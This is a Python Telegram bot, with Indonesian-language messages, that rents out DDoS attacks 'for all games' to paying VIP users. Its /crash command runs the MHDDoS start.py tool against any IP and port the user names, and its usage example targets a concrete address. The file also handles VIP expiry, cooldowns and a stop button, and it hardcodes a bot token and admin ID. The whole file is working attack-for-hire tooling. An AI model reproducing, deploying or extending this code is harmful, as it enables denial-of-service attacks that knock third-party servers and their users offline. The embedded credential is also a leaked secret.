import telebot
import subprocess
import sqlite3
from datetime import datetime, timedelta
from threading import Lock
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "7340831407:AAGoVMWtn7GizTyQRYmLWX3ZxkhDikkOXHw"
ADMIN_ID = 6095280790
START_PY_PATH = "/workspaces/MHDDoS/start.py"

bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}

conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute(
    """
    CREATE TABLE IF NOT EXISTS vip_users (
        id INTEGER PRIMARY KEY,
        telegram_id INTEGER UNIQUE,
        expiration_date TEXT
    )
    """
)
conn.commit()


@bot.message_handler(commands=["start"])
def handle_start(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()


    if result:
        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            vip_status = "❌ *Paket VIP Anda sudah habis masa berlakunya.*"
        else:
            dias_restantes = (expiration_date - datetime.now()).days
            vip_status = (
                f"✅ CLIENTE VIP!\n"
                f"⏳ Hari yang tersisa: {dias_restantes} dia(s)\n"
                f"📅 Expira en: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
            )
    else:
        vip_status = "❌ *Anda tidak memiliki paket VIP aktif.*"
    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="💻 PENJUAL - OFICIAL 💻",
        url=f"tg://user?id={ADMIN_ID}"

    )
    markup.add(button)
    
    bot.reply_to(
        message,
        (
            "🤖 *SELAMAT DATANG DI CRASH BOT [All Game]!*"
            

            f"""
```
{vip_status}```\n"""
            "🧑‍💻 *Cara menggunakan:*"
            """
```
/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n"""
            "🧑‍💻 *CONTOH:*"
            """
```
/crash UDP 143.92.125.230:10013 10 900```\n"""
            "@Dimaspratama11 🧑‍💻 USERS VIP "
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.message_handler(commands=["vip"])
def handle_addvip(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Anda bukan Penguna VIP.")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(
            message,
            "❌ Formatnya tidak valid. Gunakan: `/vip <ID> <DAYS>`",
            parse_mode="Markdown",
        )
        return

    telegram_id = args[1]
    days = int(args[2])
    expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

    with db_lock:
        cursor.execute(
            """
            INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date)
            VALUES (?, ?)
            """,
            (telegram_id, expiration_date),
        )
        conn.commit()

    bot.reply_to(message, f"✅ Pengguna {telegram_id} ditambahkan sebagai VIP selama {days} hari.")


@bot.message_handler(commands=["crash"])
def handle_ping(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()

    if not result:
        bot.reply_to(message, "❌ Anda tidak memiliki izin untuk menggunakan perintah ini.")
        return

    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiration_date:
        bot.reply_to(message, "❌ Akses VIP Anda telah kedaluwarsa")
        return

    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 10:
        bot.reply_to(message, "❌ Tunggu 10 detik sebelum memulai serangan lain dan ingatlah untuk menghentikan serangan sebelumnya.")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "❌ *Format Salah*\n\n"
                "📌 *Penggunaan yang benar:*\n"
                "`/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
                "🧑‍💻 *CONTOH:*\n"
                "`/crash UDP 143.92.125.230:10013 10 900`"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = args[3]
    duration = args[4]
    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    active_attacks[telegram_id] = process
    cooldowns[telegram_id] = time.time()

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⛔ Hentikan Serangan", callback_data=f"stop_{telegram_id}"))

    bot.reply_to(
        message,
        (
            "*[✅] SERANGAN DIMULAI- 200 [✅]*\n\n"
            f"🧑‍💻 *Port:* {ip_port}\n"
            f"🧑‍💻 *Type:* {attack_type}\n"
            f"🧑‍💻 *Threads:* {threads}\n"
            f"⏳ *durasi (ms):  {duration}\n\n"
            f"🧑‍💻 @dimaspratama11 USERS VIP 🧑‍💻"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        bot.answer_callback_query(
            call.id, "❌ Hanya pengguna yang memulai serangan yang dapat menghentikannya"
        )
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        bot.answer_callback_query(call.id, "✅ Serangan berhasil ditangkis.")
        bot.edit_message_text(
            "*[⛔] SERANGAN SELESAI[⛔]*",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            parse_mode="Markdown",
        )
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "🧑‍💻 Tidak ada serangan yang ditemukan, lanjutkan tindakan Anda")

if __name__ == "__main__":
    bot.infinity_polling()
